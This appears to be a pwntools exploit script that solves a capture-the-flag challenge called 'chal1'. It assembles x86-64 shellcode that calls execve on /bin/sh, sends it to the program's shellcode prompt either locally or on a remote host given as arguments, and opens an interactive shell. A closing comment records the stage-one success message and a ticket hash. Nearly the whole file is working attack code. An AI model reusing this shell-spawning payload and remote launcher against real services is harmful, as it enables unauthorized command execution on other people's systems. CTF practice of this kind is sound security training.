from pwn import *
from struct import pack
from Crypto.Util.number import bytes_to_long as btl, long_to_bytes as ltb
import sys

BINARY = "chal1"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script):
        if not args.RMT:
            attach(self.p, script)

    def send(self, content):
        p = self.p
        p.sendlineafter(b"Enter your shellcode:", content)

x, p = init()

x.debug("b *main+106\nc")
pay = asm(
    f"""
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 59
    mov rdi, {btl(b'/bin/sh'[::-1])}
    push rdi
    mov rdi, rsp
    syscall
    """
)
x.send(pay)

p.interactive()

'''
# Stage 1

Congrats(1/4)!

# Ticket
764fce03d863b5155db4af260374acc1
'''